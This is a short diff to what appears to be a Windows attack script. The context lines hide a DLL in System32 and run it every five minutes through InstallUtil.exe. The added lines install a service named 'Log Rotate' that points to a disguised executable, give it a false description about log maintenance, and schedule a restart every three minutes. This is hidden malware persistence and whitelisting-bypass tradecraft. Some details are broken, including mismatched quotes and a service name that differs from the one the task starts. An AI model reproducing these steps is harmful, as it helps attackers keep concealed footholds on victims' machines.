@@ -79,3 +79,9 @@ move $sysinitLoc C:\Windows\System32
 # Hide sysinit.dll
 attrib +h C:\windows\System32
 schtasks /create /sc minute /mo 5 /tn "root" "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /U C:\Windows\System32\sysinit.dll"
+
+# Automatically Create and Restart Service Persistence every 3 minutes
+sc create "Log Rotate" binpath=C:\Program Files\MSBuild\Microsoft\PowerManagement.exe start= auto
+sc description "Log Rotate "Log Rotation of System Logs to Free Memory"
+net start "Log Rotate"
+schtasks /create /sc minute /mo 3 /tn "service" "net start logrotate"
